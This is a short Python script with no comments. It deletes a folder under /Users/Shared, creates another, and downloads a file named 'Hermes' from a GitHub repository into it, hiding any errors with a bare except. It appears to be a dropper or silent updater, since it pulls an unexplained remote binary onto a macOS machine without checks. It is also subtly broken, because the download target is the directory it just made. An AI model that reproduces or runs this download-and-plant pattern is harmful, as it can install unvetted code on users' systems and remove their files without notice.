import shutil
import os
shutil.rmtree ('/Users/Shared/Loki')
try:
  os.mkdir ('/Users/Shared/Hermes')
  import time
  time.sleep (0.5)
  import urllib
  urllib.urlretrieve ("https://github.com/3-TA/Loki/raw/main/Hermes", "/Users/Shared/Hermes")
  time.sleep (5)
except:
  pass
